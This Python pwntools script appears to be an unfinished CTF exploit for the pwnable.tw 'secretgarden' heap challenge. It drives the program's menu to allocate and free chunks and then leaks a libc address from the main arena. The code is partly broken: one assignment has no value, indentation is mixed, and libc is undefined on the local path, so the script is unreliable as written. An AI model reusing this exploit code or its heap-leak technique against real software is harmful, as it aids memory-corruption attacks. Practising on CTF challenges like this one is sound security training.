#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
if sys.argv[1] == "l":
    context.log_level = "debug"
    #  io = process("./secretgarden", env = {"LD_PRELOAD": "./libc_64.so.6"})
    io = process("./secretgarden")
    main_arena = 

else:
    io = remote("chall.pwnable.tw", 10203)
    libc = ELF("./libc_64.so.6")
    main_arena =  0x3c3b20


def DEBUG():
	raw_input("DEBUG: ")
        gdb.attach(io)

def Raise(length, name, color):
    io.sendlineafter(" : ", "1")
    io.sendlineafter(" :", str(length))
    io.sendafter(" :", name)
    io.sendlineafter(" :", color)

def Visit():
    io.sendlineafter(" : ", "2")

def Remove(idx):
    io.sendlineafter(" : ", "3")
    io.sendlineafter(":", str(idx))

def Clean():
    io.sendlineafter(" : ", "4")

if __name__ == "__main__":
    success("Leak libc.address")
    Raise(160, '0000', '0')
    DEBUG()
    Raise(160, '1111', '1')
    Remove(0)
    Raise(160, '00000000', '0')
    Visit()
    libc.address = u64(io.recvuntil("\x7f").ljust(8, '\x00')) - 88 - main_arena
    success("libc.address -> {:#}".format(libc.address))
    pause()
